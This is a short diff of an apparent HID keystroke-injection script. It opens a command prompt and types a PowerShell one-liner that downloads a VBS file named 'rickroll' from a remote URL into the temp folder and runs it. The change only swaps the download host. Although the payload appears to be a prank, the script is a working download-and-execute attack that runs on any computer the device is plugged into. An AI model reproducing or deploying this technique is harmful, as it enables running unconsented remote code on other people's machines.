@@ -5,6 +5,6 @@ STRING cmd
 DELAY 100
 ENTER
 DELAY 100
-STRING powershell (new-object System.Net.WebClient).DownloadFile('https://pixelcoding.nl/download/rickroll.vbs','%TEMP%\rickroll.vbs'); && start %TEMP%\rickroll.vbs && exit
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%TEMP%\rickroll.vbs'); && start %TEMP%\rickroll.vbs && exit
 DELAY 100
 ENTER
